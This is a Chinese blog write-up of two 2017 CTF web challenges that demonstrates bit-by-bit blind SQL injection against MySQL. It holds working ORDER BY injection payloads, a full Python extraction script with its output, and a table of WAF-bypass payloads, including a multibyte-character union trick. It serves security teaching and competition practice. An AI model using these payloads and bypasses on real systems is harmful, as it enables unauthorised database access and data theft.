@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>SQL盲注按位获取数据</title>
+        <link rel="stylesheet" href="https://phuker.github.io/theme/css/main.css" />
+
+        <script type="text/javascript" src="https://phuker.github.io/theme/js/jquery-3.2.0.min.js"></script>
+        <script type="text/javascript" src="https://phuker.github.io/theme/js/cav.js"></script>
+        <script type="text/javascript" src="https://phuker.github.io/theme/js/qqmain.js"></script>
+
+        <!--[if IE]>
+            <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="https://phuker.github.io/#">Phuker  <strong>Phuker @ Blue-Whale Team</strong> </a></h1>
+                <nav><ul>
+                    <li><a href="/#">Home</a></li>
+                    <li><a href="https://phuker.github.io/category/about.html">About</a></li>
+                    <li><a href="https://phuker.github.io/category/misc.html">Misc</a></li>
+                    <li class="active"><a href="https://phuker.github.io/category/web.html">Web</a></li>
+                </ul>
+                </nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="https://phuker.github.io/sqli-bit-dump.html" rel="bookmark"
+           title="Permalink to SQL盲注按位获取数据">SQL盲注按位获取数据</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <span>2017-04-18 周二</span>
+        	<span>| by <a class="url fn" href="https://phuker.github.io/author/admin.html">admin</a></span>
+<span>| tags: <a href="https://phuker.github.io/tag/sqli.html">sqli</a></span>
+</footer><!-- /.post-info -->      <p>在某些MySQL盲注情况下，不能用常见的二分法爆库。这里是一种按bit爆破每一个字符的方法。我在0CTF 2017 想出来这种方法，然后BCTF 2017 找到Payload之后直接复制代码改了改就解出了题目。当然，这种思路 too simple，早已经<a href="http://www.securitylearn.net/tag/dump-database-in-blind-sql-injection/" target="_blank">有人</a>想到了这种方法。   </p>
+<h1>0CTF 2017 Web Temmo's Tiny Shop</h1>
+<p>(以下内容摘自<a href="https://www.cnblogs.com/go2bed/p/6607565.html" target="_blank">我的旧博客</a>,略有删改)  </p>
+<p>洒家参加了0CTF 2017，做了一些题目。赛后过了好几天，看网上已经有了一些写得不错的Writeup，这里就写一写洒家的一些不一样的思路。<br>
+一些不错的Writeup  </p>
+<ul>
+<li><a href="https://ctftime.org/event/402/tasks/" target="_blank">https://ctftime.org/event/402/tasks/</a></li>
+<li><a href="http://www.melodia.pw/?p=889" target="_blank">http://www.melodia.pw/?p=889</a></li>
+<li><a href="http://lorexxar.cn/2017/03/21/0ctf2017-web/" target="_blank">http://lorexxar.cn/2017/03/21/0ctf2017-web/</a></li>
+</ul>
+<p>这道题有一个商店，可以购买商品，其中查询已购买商品的 <code>http://202.120.7.197/app.php</code> 存在 order by 盲注。<br>
+洒家看网上的Writeup 在拿到Hint，知道flag的表名后爆破flag的每一字节，效率可能比较低。这里是洒家比赛的时候想到的按bit爆破的方法，对于ASCII，只考虑7bit，每字节固定需要7次请求即可得到。<br>
+需要购买Erwin Schrodinger's Cat和Brownie。<br>
+一开始的Payload是：  </p>
+<div class="highlight"><pre><span></span>case(ascii(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1))div(16)mod(2))when(1)then(name)else(price)end
+</pre></div>
+
+
+<p>由于长度限制（WAF，最长100字节），修改Payload：  </p>
+<div class="highlight"><pre><span></span>if(ascii(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1))div(16)mod(2),name,price)
+</pre></div>
+
+
+<p>由于长度还是太长，把Price改成3也可以排序。    </p>
+<div class="highlight"><pre><span></span>if(ascii(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1))div(16)mod(2),name,3)
+</pre></div>
+
+
+<p>注：此处的3并不是按第3列排序，即和order by 3 作用不同，而是和 order by '3' 作用相同，和不加order by 效果相同（不知道是MySQL什么特性）<br>
+由此，最终的脚本是：  </p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="c1"># code from https://phuker.github.io/</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span><span class="s1">&#39;YOURCOOKIE&#39;</span><span class="p">}</span> <span class="c1"># add your cookie</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://202.120.7.197/app.php&#39;</span>
+
+<span class="n">true_str</span> <span class="o">=</span> <span class="s1">&#39;&quot;goods&quot;:[{&quot;id&quot;:&quot;5&quot;&#39;</span>
+<span class="n">false_str</span> <span class="o">=</span> <span class="s1">&#39;&quot;goods&quot;:[{&quot;id&quot;:&quot;2&quot;&#39;</span>
+<span class="n">order_by_template</span> <span class="o">=</span> <span class="s1">&#39;if(ascii(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),</span><span class="si">%d</span><span class="s1">,1))div(</span><span class="si">%d</span><span class="s1">)mod(2),name,3)&#39;</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="k">for</span> <span class="n">place_index</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
+    <span class="n">place_bin</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">for</span> <span class="n">times</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">**</span> <span class="n">times</span>
+        <span class="n">order_by</span> <span class="o">=</span> <span class="n">order_by_template</span> <span class="o">%</span> <span class="p">(</span><span class="n">place_index</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;action&#39;</span><span class="p">:</span><span class="s1">&#39;search&#39;</span><span class="p">,</span><span class="s1">&#39;keyword&#39;</span><span class="p">:</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;order&#39;</span><span class="p">:</span><span class="n">order_by</span><span class="p">}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+        <span class="c1">#print r.content</span>
+        <span class="k">if</span> <span class="n">true_str</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+            <span class="n">new_place_bin</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">new_place_bin</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span>
+        <span class="k">print</span> <span class="n">new_place_bin</span><span class="p">,</span>
+        <span class="n">place_bin</span> <span class="o">+=</span> <span class="n">new_place_bin</span>
+
+    <span class="n">place</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">place_bin</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+    <span class="n">flag</span> <span class="o">+=</span> <span class="n">place</span>
+    <span class="k">print</span> <span class="n">flag</span>
+
+
+    <span class="k">if</span> <span class="s1">&#39;}&#39;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+        <span class="k">break</span>
+
+<span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">***** get flag *****&#39;</span>
+<span class="k">print</span> <span class="n">flag</span>
+</pre></div>
+
+
+<p>运行效果：</p>
+<div class="highlight"><pre><span></span>1 1 0 0 1 1 0 f
+1 1 0 1 1 0 0 fl
+1 1 0 0 0 0 1 fla
+1 1 0 0 1 1 1 flag
+1 1 1 1 0 1 1 flag{
+1 1 1 0 0 1 0 flag{r
+(省略）
+1 1 0 0 1 0 1 flag{r4ce_c0nditi0n_i5_excite
+1 1 0 0 1 0 0 flag{r4ce_c0nditi0n_i5_excited
+1 1 1 1 1 0 1 flag{r4ce_c0nditi0n_i5_excited}
+
+***** get flag *****
+flag{r4ce_c0nditi0n_i5_excited}
+</pre></div>
+
+
+<h1>BCTF 2017 Alice and Bob</h1>
+<p>这道题就是个纯SQL注入，输入名字（user表只有Alice和Bob两项），然后查询这个user的说明（desc字段）。随便输入一个单引号就有MySQL报错。简单测试了一下有WAF，WAF的逻辑不是以前的CTF那种白名单、黑名单，而是非常复杂的逻辑（后来才知道是某商业产品）。虽然说最好的绕过WAF的方法是让WAF失效，但是洒家并没有找到这种方法，只能正面解决这个问题。  </p>
+<p>以下是“刚正面”的过程：<br>
+首先根据报错，等信息，数据库名是<code>bctf</code>，SQL查询的表名是<code>user</code>，字段名是 <code>id name desc</code>。另一个表叫<code>flag</code>，字段：<code>id flag</code>。猜测SQL应该类似：  </p>
+<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="k">desc</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">where</span> <span class="n">name</span><span class="o">=</span><span class="s1">&#39;用户输入&#39;</span>
+</pre></div>
+
+
+<p>发现：</p>
+<table>
+<thead>
+<tr>
+<th>输入</th>
+<th>现象分析</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>name=alice'=0#</code></td>
+<td>没有过滤</td>
+</tr>
+<tr>
+<td><code>name=alice'=0%26name='bob'=0#</code></td>
+<td>没有过滤</td>
+</tr>
+<tr>
+<td><code>name=alice'=0+and+name='bob'=0#</code></td>
+<td>过滤</td>
+</tr>
+<tr>
+<td><code>name=sleep(9)</code></td>
+<td>过滤</td>
+</tr>
+<tr>
+<td><code>name=sleep(6-4)</code></td>
+<td>没有过滤。说明WAF对<code>sleep(纯数字)</code>的过滤可能可以绕过</td>
+</tr>
+<tr>
+<td><code>name='&gt;sleep(6-4)#</code></td>
+<td>成功sleep</td>
+</tr>
+<tr>
+<td><code>name=a'=0#</code><br /><code>name=a'=sleep(5-4)#</code></td>
+<td>输出Alice</td>
+</tr>
+<tr>
+<td><code>name='or id='2</code></td>
+<td>队友发现的这条。id只能是1和2，说明这个表可能只有两条数据，flag在别的表里面。</td>
+</tr>
+<tr>
+<td><code>name='or flag='0</code></td>
+<td>报错<code>{"desc": "Unknown column 'flag' in 'where clause'"}</code>。用这种方法确定字段，以及没有flag字段</td>
+</tr>
+<tr>
+<td><code>name='or user.id='0</code></td>
+<td>没有报错。表名是user。注意不能用来测试<code>flag.flag</code>。</td>
+</tr>
+<tr>
+<td><code>name='or user.`desc`='Alice is a good girl.</code></td>
+<td>输出Alice的desc</td>
+</tr>
+<tr>
+<td><code>name='or (select 1 from flag) or '1</code></td>
+<td>试了很多，这种 subquery 直接都被干掉了</td>
+</tr>
+<tr>
+<td><code>name='not in (select flag from flag)#</code></td>
+<td><strong>意外发现没有过滤， <code>in</code> 操作符有奇效</strong>。然后可以猜出来flag表，flag字段。</td>
+</tr>
+<tr>
+<td><code>name='in (select substr(flag,1,1) from flag)#</code></td>
+<td>被屏蔽。substr() 很敏感</td>
+</tr>
+<tr>
+<td><code>name='=all (select substr(flag,1,1) from flag)#</code></td>
+<td><strong>意外发现换成<code>=ALL</code></strong>有奇效</td>
+</tr>
+<tr>
+<td><code>name=Alice'&lt;&gt;all (select ord(substr(flag,1,1)) div(16) mod(2) from flag)#</code></td>
+<td>被过滤</td>
+</tr>
+<tr>
+<td><code>name=Alice'in (select ord(substr(flag,1,1)) div 16 mod 2 from flag)#</code></td>
+<td>被过滤</td>
+</tr>
+<tr>
+<td><code>name=Alice'&lt;&gt;all (select ord(substr(flag,1,1)) div 16 mod 2 from flag)#</code></td>
+<td>辗转测试了一堆这种组合，这个没有被过滤。</td>
+</tr>
+<tr>
+<td><code>name=Alice' =all (select ord(substr(flag,1,1)) div 16 mod 2 from flag)#</code></td>
+<td>没有过滤</td>
+</tr>
+</tbody>
+</table>
+<p>以<code>name=Alice' =all (select ord(substr(flag,1,1)) div 16 mod 2 from flag)#</code>为例，注入之后这条SQL的含义是: 假如name是'Alice'，name='Alice'的值是1, 然后和后面的子查询比较，如果子查询的bit是1，Alice就会被输出。然后对每一字节的每一位操作即可得到flag。脚本和上面的0CTF的基本一样。<br>
+输出：     </p>
+<div class="highlight"><pre><span></span>1 0 0 0 0 1 1 &#39;C&#39;
+1 1 0 1 1 1 1 &#39;Co&#39;
+（省略）
+0 1 1 0 1 0 0 &#39;Cool, give you an interesting string: bctf{0ad99685303ed109abed3a80269563c4&#39;
+1 1 1 1 1 0 1 &#39;Cool, give you an interesting string: bctf{0ad99685303ed109abed3a80269563c4}&#39;
+
+***** get flag *****
+Cool, give you an interesting string: bctf{0ad99685303ed109abed3a80269563c4}
+</pre></div>
+
+
+<h2>谜之让WAF失效</h2>
+<p>根据<a href="http://www.bendawang.site/article/BCTF-2017-WEB-WriteUp">Bendawang的这篇write up</a>: </p>
+<div class="highlight"><pre><span></span>name=%c0%c0%c0&#39; union select flag from flag #
+响应：
+{&quot;desc&quot;: &quot;Cool, give you an interesting string: bctf{0ad99685303ed109abed3a80269563c4}&quot;}
+</pre></div>
+
+
+<p><strong>毁三观。</strong><br>
+测试了一下，在上面的payload里面，ASCII &gt;= 128 的字符重复3次或者&gt;=8次即可输出flag。  </p>
+<h1>如何搞出这种稀奇古怪的Payload</h1>
+<ul>
+<li>看文档</li>
+</ul>
+<p><a href="https://dev.mysql.com/doc/refman/5.7/en/comparison-operators.html">https://dev.mysql.com/doc/refman/5.7/en/comparison-operators.html</a><br>
+<a href="https://dev.mysql.com/doc/refman/5.7/en/any-in-some-subqueries.html">https://dev.mysql.com/doc/refman/5.7/en/any-in-some-subqueries.html</a><br>
+<a href="https://dev.mysql.com/doc/refman/5.7/en/all-subqueries.html">https://dev.mysql.com/doc/refman/5.7/en/all-subqueries.html</a><br>
+<a href="https://dev.mysql.com/doc/refman/5.7/en/any-in-some-subqueries.html">https://dev.mysql.com/doc/refman/5.7/en/any-in-some-subqueries.html</a><br>
+<a href="https://dev.mysql.com/doc/refman/5.7/en/select.html">https://dev.mysql.com/doc/refman/5.7/en/select.html</a>  </p>
+<ul>
+<li>本地搭环境  </li>
+</ul>
+<p>模拟题目环境，测试自己的Payload的正确性。想当然危害大。</p>
+<ul>
+<li>学习他人人生的经验  </li>
+</ul>
+<p><a href="https://www.exploit-db.com/papers/17934/">Beyond SQLi: Obfuscate and Bypass</a><br>
+可以研究一下SQLmap的各种Payload的含义。搞个网页记录Payload然后扫描。</p>
+<p><br /><br />
+洒家并不太擅长SQL注入，以上只是学习过程中的一点见解。    </p>
+    </div><!-- /.entry-content -->
+    <p></p>
+    <br />
+    <br />
+    <hr style="border: 1px solid #EEEEEE;" />
+    <p>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）<p>
+    <br />
+    <div class="comments">
+      <h2>Comments</h2>
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = "https://phuker.github.io/sqli-bit-dump.html";
+          this.page.identifier = "sqli-bit-dump.html"; 
+        };
+        (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://phuker.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+      </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    </div>
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="blogroll">
+                        <h2>blogroll</h2>
+                        <ul>
+                            <li><a href="http://blue-whale.me" target="_blank">Blue-Whale Team</a></li>
+                        </ul>
+                </div><!-- /.blogroll -->
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+
+                            <li><a href="https://github.com/phuker" target="_blank">GitHub</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <p>Powered by <a href="http://getpelican.com/" target="_blank">Pelican</a>. Theme <a href="https://github.com/blueicefield/pelican-blueidea/" target="_blank">blueidea</a>, inspired by the default theme. Modified by Blue-Whale Team.</p>
+        </footer><!-- /#contentinfo -->
+
+<script id="dsq-count-scr" src="//phuker.disqus.com/count.js" async></script>
+</body>
+</html>
